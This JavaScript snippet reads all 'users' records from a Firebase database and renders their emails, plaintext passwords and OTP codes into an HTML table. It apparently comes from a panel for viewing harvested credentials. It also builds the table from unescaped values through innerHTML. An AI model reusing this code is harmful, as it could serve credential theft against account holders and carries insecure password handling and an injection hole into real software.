firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();
const usersRef = dbRef.child('users');

function readPassword() {
  usersRef.once("value")
    .then(function(snapshot) {
      var data = snapshot.val();
      var tableHtml = "<table class='table table-striped'><thead><tr><th>Email</th><th>Password</th><th>OTP</th><th>PASSWORD</th></tr></thead><tbody>";

      for (var key in data) {
        tableHtml += "<tr>";
        for(var usd in data[key]){
        	tableHtml += "<td>"+data[key][usd]+"</td>";
        }
        tableHtml += "</tr>";
      }

      tableHtml += "</tbody></table>";

      // Display the table in an HTML element with id "table-container"
      document.getElementById("table-container").innerHTML = tableHtml;
    })
    .catch(function(error) {
      console.error("Error reading data:", error);
    });
}
